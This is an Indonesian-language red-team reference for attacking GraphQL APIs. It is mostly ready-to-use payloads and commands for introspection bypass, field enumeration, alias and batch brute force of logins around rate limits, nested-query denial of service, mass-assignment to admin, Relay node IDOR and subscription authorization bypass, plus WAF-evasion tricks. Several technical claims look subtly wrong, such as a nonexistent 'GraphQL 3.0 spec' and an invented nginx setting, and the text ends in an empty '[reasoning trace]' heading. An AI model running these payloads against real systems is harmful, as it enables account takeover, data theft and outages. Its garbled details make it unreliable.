# graphql — api

# GraphQL: Referensi Serangan & Pertahanan (Red Team)

## 1. Introspection

**Apa yang dikirim:**
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives { name description locations args { ...InputValue } }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue }
fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }
}
```
POST ke `/graphql`, header `Content-Type: application/json`, body `{"query":"..."}`.

**Apa yang muncul:** dump schema lengkap (tipe, field, argumen, enum). Di GraphQL-server yang benar (graphql-js ≥ 15, Apollo Server ≥ 3), introspection on-by-default; kadang off di prod.

**Kenapa berhasil/gagal:** berhasil bila server tidak men-disable; gagal (`"Introspection is disabled"` / `GRAPHQL_VALIDATION_FAILED`) bila `NoSchemaIntrospectionCustomRule` dipasang.

## 2. Bypass Introspection Disabled

**Teknik yang dikirim:**

| Teknik | Payload / Prasyarat | Efek |
|---|---|---|
| Field suggestion | Query field salah: `{ user { passwrd } }` | Error `Did you mean "password"?` — bocor nama field |
| Alias bypass rule | `{ a:__schema { types { name } } }` | Kadang rule salah-matching nama |
| GraphQL 3.0 spec `__Type.kind` traversal | `{ __type(name:"User"){ fields{ name } } }` | `__type` sering tidak diblok walau `__schema` diblok — coba satu-satu |
| HTTP method switch | GET `?query={__schema{types{name}}}` | Middleware blokir biasanya hanya POST |
| Content-Type | `application/graphql`, `text/plain` | Parser custom kadang lolos |
| Path switch | `/graphql`, `/api/graphql`, `/v1/graphql`, `/graphiql`, `/graphql/console` | Route berbeda = rule berbeda |
| `@include`/`@skip` | `{ __schema @include(if:true){ types{name} } }` | Error message berbeda = oracle |
| Playground/GraphiQL | GET `/graphiql`, `/playground`, `/altair` | Sering tidak di-guard |

**Cek cepat:**
```bash
curl -s -X POST https://t/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{queryType{name}}}"}' | jq .

curl -s "https://t/graphql?query=%7B__schema%7Btypes%7Bname%7D%7D%7D"

curl -s -X POST https://t/graphql -H 'Content-Type: application/graphql' \
  --data '{__schema{types{name}}}'
```

**Kenapa berhasil:** sebagian implementasi whitelist field via skema statis tidak menyertakan `__schema`/`__type` atau memblok hanya di satu route/method.

## 3. Field Suggestion Brute Force

**Apa yang dikirim:** query berisi field/argumen salah eja; server mengembalikan saran.

```graphql
{ user(id:1) { passwrd } }
```
Response:
```json
{"errors":[{"message":"Cannot query field \"passwrd\" on type \"User\". Did you mean \"password\"?"}]}
```

Loop ejaan umum: `pass`, `pwd`, `passwd`, `passw`, `passwor`, `hash`, `pwhash`, `secret`, `token`, `apiKey`, `api_key`, `credential`.

**Kenapa berhasil:** `graphql-js` mengaktifkan `didYouMean` secara default; `ValidationContext` mengembalikan saran Levenshtein. Fail bila server set `NoDeprecatedCustomRule` + `custom validation` yang men-suppress saran, atau bila tipe di-`@deprecated` dan field disembunyikan.

## 4. Batching & Aliasing untuk Brute Force

**Aliasing (single request, banyak field):**
```graphql
mutation {
  a0: login(email:"a@x", password:"pass1") { token }
  a1: login(email:"a@x", password:"pass2") { token }
  a2: login(email:"a@x", password:"pass3") { token }
  # ... hingga ratusan
}
```
Response berisi array alias; bypass rate-limit per-IP/per-akun bila limiter menghitung request bukan operasi.

**Query batching (JSON array):**
```json
[
  {"query":"mutation($p:String!){login(password:$p){token}}","variables":{"p":"pass1"}},
  {"query":"mutation($p:String!){login(password:$p){token}}","variables":{"p":"pass2"}}
]
```
POST body berupa array — banyak server GraphQL (Apollo Server, graphql-yoga) memproses sebagai batch. Limiter berbasis request-count di nginx `limit_req` (`nginx 1.25`) akan melihat 1 request saja.

**Bypass rate-limit tambahan:** HTTP/2 multiplexing (Chrome 131 default) memperbanyak stream ke 1 koneksi; limiter per-connection BUKAN per-stream.

**Kenapa berhasil:** auth code memanggil resolver per alias/batch; lockout per-akun tidak dijaga. Fail bila operasi di-batch dan `@unique`-type enforcement memaksa satu operasi per request, atau bila resolver berbagi mutex + `userId` counter tanpa memandang alias.

**Payload verifikasi:** kirim `mutation { a:__typename b:__typename ... }` ×5000 — bila respons ~detik tanpa 429, batching lolos.

## 5. Nested Query DoS

**Apa yang dikirim:** query rekursif via relasi sirkuler (`User.friends.friends...`) atau fragment rekursif.

```graphql
query D {
  user(id:1) {
    friends(first:100) { friends(first:100) { friends(first:100) {
      friends(first:100) { friends(first:100) { friends(first:100) { id } } }
    } } }
  }
}
```
Atau alias amplification:
```graphql
{ u1:user(id:1){id} u2:user(id:2){id} ... u1000:user(id:1000){id} }
```
Atau fragment rekursif (bila validator lemah):
```graphql
fragment F on User { friends { ...F } }
{ user(id:1){ ...F } }
```

**Apa yang muncul:** query timeout 30s+, worker pool penuh, 502/504 dari nginx 1.25 (`proxy_read_timeout 30s`).

**Kenapa berhasil:** server tanpa *query depth limit* (`graphql-depth-limit`), tanpa *complexity analysis* (`graphql-cost-analyzer`, `@graphql-cost`), tanpa `maxAliases`/`maxTokens`. graphql-js sendiri TIDAK membatasi depth. Fail bila `graphql-armor` (`maxDepth:10`, `costLimit`) atau Apollo `queryLimits` dipasang.

**Cek cepat:** kirim depth 20 dummy; 200 → tanpa limit. Depth 500 → bila 200 dan lambat, DoS viable.

## 6. Mutation Abuse

**Apa yang dikirim:**
```graphql
mutation {
  updateUser(id:"victim", input:{email:"attacker@evil"}) { id email }
}
```
Atau lewat batching: ratusan `updateUser` dalam satu request; atau chained mutation membuat akun lalu eskalasi role (`role:"admin"` bila inputType `UserInput` tidak filter).

**Pola umum:**
- Mass-assignment: `input:{role:"admin",isAdmin:true,verified:true}` pada mutation registrasi/update profil.
- Enum abuse: `role: ADMIN` bila enum diterima langsung.
- Chained: `register` → `verifyEmail(token dari response)` → `login` → `updateUser(role:ADMIN)` dalam satu operasi.

**Kenapa berhasil:** tidak ada input filtering level resolver; schema mengizinkan field privileged di tipe input umum. Fail bila server pakai allowlist input (`pick`), `inputType` terpisah untuk user vs admin, atau authorization per-field (directive `@auth(requires:ADMIN)`).

## 7. IDOR via `node(id:)` (Relay Global ID)

**Apa yang dikirim:**
```graphql
{
  node(id:"VXNlcjox") { id ... on User { email phone }
                         ... on Admin { secrets }
                         ... on Order { total cardLast4 } }
}
```
`id` Relay = base64 dari `"<Type>:<PK>"`. Decode cepat:
```bash
echo 'VXNlcjox' | base64 -d   # User:1
echo -n 'User:1' | base64     # VXNlcjox
```

**Enumerasi tipe:**
```graphql
{ a:node(id:"VXNlcjox"){ ... on User {id} }
  b:node(id:"QWRtaW46MQ=="){ ... on Admin {id} }
  c:node(id:"T3JkZXI6MQ=="){ ... on Order {id total} } }
```

**Apa yang muncul:** objek milik user lain jika resolver `node(id)` tidak cek ownership + tidak cek tipe aktual. `... on X` hanya me-render field X, tetapi objek yang di-resolve tetap berdasarkan `id`.

**Kenapa berhasil:** implementasi `node` interface hasil Relay biasanya memetakan ID → object tanpa `authorize(user, object)`. Fail bila resolver `node` di-wrap `@auth` di level scalar atau `id` = opaque HMAC (bukan base64 plaintext).

**Cek otomatis:** ganti `User:1` → `User:2`, bandingkan respons. Bila `email`/`phone` muncul → confirmed IDOR.

## 8. Subscription Authorization

**Apa yang dikirim:**
```graphql
subscription {
  userUpdated(userId:"victim-uuid") { id email role lastLogin }
}
```

Over websocket (`graphql-ws` protokol, atau `graphql-transport-ws`):
```
CONNECT → {"type":"connection_init","payload":{"Authorization":"Bearer <token>"}}
       ← {"type":"connection_ack"}
SUBSCRIBE id=1 → {"id":"1","type":"subscribe","payload":{"query":"subscription{userUpdated(userId:\"victim\"){email}}"}}
```

**Bypass umum:**
- Auth hanya di `connection_init`, tidak di `SUBSCRIBE`. Koneksi anonim lalu subscribe ke `userUpdated` tanpa filter → terima update seluruh tenant.
- `onConnect` tidak dipanggil ulang per-topik, sehingga token kedaluwarsa/tidak relevan diterima.
- Auth via `connectionParams` tetapi server cek `context.user` sekali di handshake.

**Apa yang muncul:** frame `next` berisi payload objek user lain; atau langsung `next` tanpa error.

**Kenapa berhasil:** logika authz subscription sering di `onConnect` saja, bukan `onSubscribe`/resolver subscribe (`subscribe()` function). Fail bila server memvalidasi per `SUBSCRIBE` dan menerapkan filter `userId == context.user.id`.

**Cek:** dengan token user A, subscribe `userUpdated(userId: <B>)`; bila aliran data B masuk → broken object-level authz pada subscription.

Tool: `graphql-ws-client` npm, atau `wscat -c wss://t/graphql -s graphql-transport-ws` lalu kirim frame manual.

## 9. Tooling

| Tool | Versi (min) | Perintah utama |
|---|---|---|
| **graphql-cop** | 1.x | `graphql-cop -t https://target/graphql -o json` |
| **InQL** (Burp ext / CLI) | 4.x | `inql -t https://target/graphql -o ./out` atau via Burp BApp |
| **clairvoyance** | 0.4.x | `clairvoyance https://target/graphql -o schema.json -w wordlist.txt -H "Authorization: Bearer $TOK"` |
| **graphql-map** | 0.1 | `graphql-map -e https://target/graphql -H "Cookie: $C"` untuk fuzz IDOR |
| **graphw00f** | 1.1.x | `graphw00f -d -f -t https://target/graphql` untuk fingerprint engine |
| **Altair / GraphiQL** | — | manual Explore tab |

**graphql-cop — output yang dicari:**
```json
[
 {"title":"Introspection","description":"...","severity":"INFO","result":true},
 {"title":"Field Suggestions","severity":"LOW","result":true},
 {"title":"GraphiQL","severity":"MEDIUM","result":true},
 {"title":"GET Method Support","severity":"LOW","result":true},
 {"title":"Query Batching","severity":"LOW","result":true},
 {"title":"Alias Overloading","severity":"LOW","result":true},
 {"title":"Directives Overloading","severity":"LOW","result":true}
]
```

**InQL — alur:**
1. Generate query templates dari schema.
2. Kirim via repeater, filter `node`, `edges`.
3. Fuzz ID di template IDOR.

**clairvoyance — saat introspection disabled:**
```bash
clairvoyance https://t/graphql -o schema.json \
  -w /usr/share/seclists/Discovery/Web-Content/graphql.txt \
  -H 'Authorization: Bearer <TOK>' -i 10
```
Me-rekonstruksi schema dari field-suggestion error. Batas: butuh server aktifkan `didYouMean`; bila disabled → tidak efektif.

## 10. Jebakan Operasional di Lapangan

| Jebakan | Kenapa gagal | Mitigasi red-team |
|---|---|---|
| **graphql-js `NoSchemaIntrospectionCustomRule` aktif** | `__schema` & `__type` error; bukan berarti field suggestion mati | Cek `didYouMean` dulu; gunakan clairvoyance |
| **Persisted queries (APQ / Relay)** | Server hanya izinkan query ter-hash; payload acak ditolak `PersistedQueryNotFound` | Ekstrak manifest hash, replay query asli; atau find endpoint non-APQ |
| **PersistedQueriesOnly di gateway** | Semua query arbitrary ditolak di edge (Apollo Router, WunderGraph) | Fokus ke endpointGraphQL backend internal; bypass via header `x-apollo-operation-name` bila leak |
| **Field suggestion dimatikan** | `Did you mean` tidak muncul → clairvoyance kosong | Fuzz manual enumerasi field dari error tipe (`Cannot query field` vs `Cannot return null`) |
| **Batching dimatikan di gateway** | Body array ditolak 400 | Cek `allowBatching:false` (Apollo Server 4 default batching masih bisa on); fallback alias |
| **Rate-limit per-operasi (mirip)** | 429 setelah N operasi dalam 1 request | Split ke beberapa request, jitter 50-200ms |
| **Depth-limit di edge (graphql-armor)** | Depth >10 → 400 `maxDepthExceeded` | Gunakan breadth-amplification (alias banyak) alih-alih depth |
| **WAF ModSecurity + OWASP CRS** (nginx 1.25 + CRS 4.x) | Payload `__schema` sering diblok di body JSON jika `paranoia-level` ≥2 | Encoded unicode `\u005f_`, ganti method GET, ganti Content-Type |
| **`subscription` dijaga `connection_init` auth** | Anonim ditolak connect | Pakai akun valid lalu target `userId` korban (IDOR subscription) |
| **Apollo Server 4 `csrfPrevention: true`** | POST `application/json` tanpa `apollo-require-preflight` → 400 | Kirim header `apollo-require-preflight: true` + `x-apollo-operation-name` |
| **Persisted mutation (`@defer`/`@stream`)** | Response partial; alat parsing sering salah | Normalisasi respons by `path` field |
| **GraphQL over HTTP GET diblok** | Rate-limit per-IP di CDN (Cloudflare) | Multiplexing HTTP/2 (Chrome 131) atau WebSocket `graphql-ws` |
| **`node(id:)` opaque HMAC** | Base64 tamper gagal; IDOR mati | Fokus enumeration via field lain (`userByEmail`, `orderByNumber`) |
| **Enum types di `inputType` di-whitelist server** | Mutation abuse `role:ADMIN` ditolak | Chain lewat mutation lain (`inviteUser(role:"admin")`) yang punya cek terpisah |
| **Field deprecated di-hide dari introspection** | Field `password` tak muncul di schema dump | Kirim `includeDeprecated:true` di `__type.fields`; bila server tetap sembunyikan → fuzz via error |
| **Introspection disabled + field suggestion disabled + APQ aktif** | Semua enumerasi buta | Waktu habis — pivot ke endpoint `REST /api/*` atau gRPC gateway yang ekspos |

**Angka acuan cepat:**
- `graphql-js` >= 16.8 default `didYouMean` aktif.
- `graphql-armor` defaults: `maxDepth:6`, `maxAliases:15`, `costLimit:5000`, `maxTokens:1000`.
- `Apollo Server 4` default `csrfPrevention:true` butuh header `apollo-require-preflight`.
- `graphql-ws` protokol `graphql-transport-ws` (bukan `graphql-ws` lama) — mismatch protokol = koneksi ditutup 1002.
- `nginx 1.25`: `client_max_body_size` default 1m — batch besar terpotong 413; naikkan lewat `large_client_body` atau split.
- `Clairvoyance` throughput ~3-10 field/detik (network bound); 5000 kata wordlist ≈ 10-25 menit.

---

## [reasoning trace]


